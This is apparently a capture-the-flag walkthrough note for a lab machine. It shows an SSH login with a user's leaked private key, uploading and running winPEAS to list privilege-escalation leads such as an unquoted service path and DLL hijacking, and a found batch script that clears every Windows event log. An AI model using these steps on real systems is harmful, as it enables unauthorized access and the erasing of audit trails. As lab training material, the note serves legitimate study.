After leveraging the XXE vulnerability (see [[04 - XXE]]), daniel's ssh key is exposed.

```
┌──(kali㉿kali)-[~]
└─$ ssh -i ~/.ssh/markup_daniel_key daniel@10.129.95.192
< ENTER >

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>

```

## Snooping around
```
daniel@MARKUP C:\Users\daniel>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

#  winpeas

### uploading, running, downloading
```
┌──(kali㉿kali)-[~]
└─$ scp -i ~/.ssh/markup_daniel_key /usr/share/peass/winpeas/winPEASx64.exe daniel@10.129.95.192:                        
winPEASx64.exe                             100% 9918KB   1.8MB/s   00:05




┌──(kali㉿kali)-[~]
└─$ scp -i ~/.ssh/markup_daniel_key  daniel@10.129.95.192:winpeas.txt .
winpeas.txt                                100%  471KB 139.0KB/s   00:03 
```

Winpeas snippets
```
    mysql(mysql)[C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql
\bin\my.ini mysql] - Autoload - No quotes and Space detected                 
    File Permissions: daniel [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (daniel [Allo
w: AllAccess], Users [Allow: AppendData/CreateDirectories WriteData/CreateFil
es])    
```

## job.bat
There is a suspicious file worth investigating
```
PS C:\> cd .\Log-Management\
PS C:\Log-Management> ls


    Directory: C:\Log-Management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat


PS C:\Log-Management> type job.bat
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")       
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit

```